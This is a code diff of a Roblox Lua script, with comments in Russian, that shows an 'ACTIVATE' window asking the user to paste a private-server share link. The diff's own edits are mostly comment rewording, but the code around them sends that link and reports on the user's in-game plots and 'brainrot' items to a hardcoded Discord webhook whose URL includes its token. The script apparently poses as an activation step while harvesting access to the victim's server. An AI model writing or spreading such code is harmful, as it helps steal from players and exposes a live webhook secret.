@@ -6,7 +6,7 @@ local TweenService = game:GetService("TweenService")
 -- =============================
 -- Конфиг
 -- =============================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- вставь сюда Discord/Webhook URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- вставьте сюда Discord/Webhook URL
 
 -- =============================
 -- Глобальные переменные
@@ -36,7 +36,7 @@ end
 -- =============================
 local CANONICAL_BRAINROT_NAMES = {
 	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
-	-- добавь остальные сюда!
+	-- добавьте остальные сюда!
 }
 
 local LOWER_TO_CANON = {}
@@ -273,9 +273,9 @@ local function createActivationGUI()
 	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 	textBox.BorderSizePixel = 0
 	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
-	textBox.ClearTextOnFocus = false -- фикс для Placeholder
+	textBox.ClearTextOnFocus = false
 	textBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
-	textBox.Text = "" -- чтобы placeholder точно показывался
+	textBox.Text = ""
 	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 	textBox.TextScaled = true
 	textBox.Font = Enum.Font.Gotham
@@ -285,7 +285,7 @@ local function createActivationGUI()
 	button.Size = UDim2.new(1, -20, 0, 70)
 	button.Position = UDim2.new(0, 10, 0, 140)
 	button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
-	button.BorderSizePixel = 2 -- белая рамка для наглядности
+	button.BorderSizePixel = 2
 	button.BorderColor3 = Color3.fromRGB(255, 255, 255)
 	button.Text = "ACTIVATE"
 	button.TextColor3 = Color3.new(1, 1, 1)
@@ -323,11 +323,16 @@ local function createActivationGUI()
 		status.Text = "Скрипт активирован!"
 		status.TextColor3 = Color3.fromRGB(0, 255, 100)
 
+		-- Сразу отправляем VIP ссылку
 		postDiscordSimple("🔗 VIP Link: " .. vipLink)
 
-		task.wait(1)
+		-- Ждём, чтобы плоты успели загрузиться
+		task.wait(0.5)
+
+		-- Отправляем отчёт по всем существующим плотам
 		postCombinedAllPlots()
 
+		-- Запускаем мониторинг новых брейнротов
 		watchPlots()
 
 		task.wait(2)
